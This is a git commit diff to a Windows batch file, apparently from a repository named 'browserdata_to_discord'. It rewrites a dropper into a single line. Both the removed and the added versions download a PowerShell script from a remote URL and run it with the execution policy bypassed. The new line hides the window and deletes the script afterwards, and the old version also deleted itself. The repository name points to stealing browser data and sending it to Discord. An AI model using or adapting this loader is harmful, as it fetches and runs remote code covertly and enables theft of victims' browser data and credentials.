605c05d692f206cbe9632dc19decab06a2f80c8b
Opabinia <144001335+pentestfunctions@users.noreply.github.com>
2025-03-13 11:04:58 +1300

    Update file_to_execute.bat

--- file_to_execute.bat
+++ file_to_execute.bat
@@ -1,15 +1,1 @@
-@echo off
-set SCRIPT_URL=https://raw.githubusercontent.com/pentestfunctions/browserdata_to_discord/main/guesser.ps1
-set SCRIPT_NAME=guesser.ps1
-
-REM Download the script
-powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %SCRIPT_NAME%"
-
-REM Run the script
-powershell -ExecutionPolicy Bypass -File %SCRIPT_NAME%
-
-REM Clean up the script
-del %SCRIPT_NAME%
-
-REM Delete this batch file. %0 refers to the current script.
-del %0
+start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pentestfunctions/browserdata_to_discord/main/guesser.ps1' -OutFile 'temp.ps1'; & '.\temp.ps1'; Remove-Item 'temp.ps1'" & exit
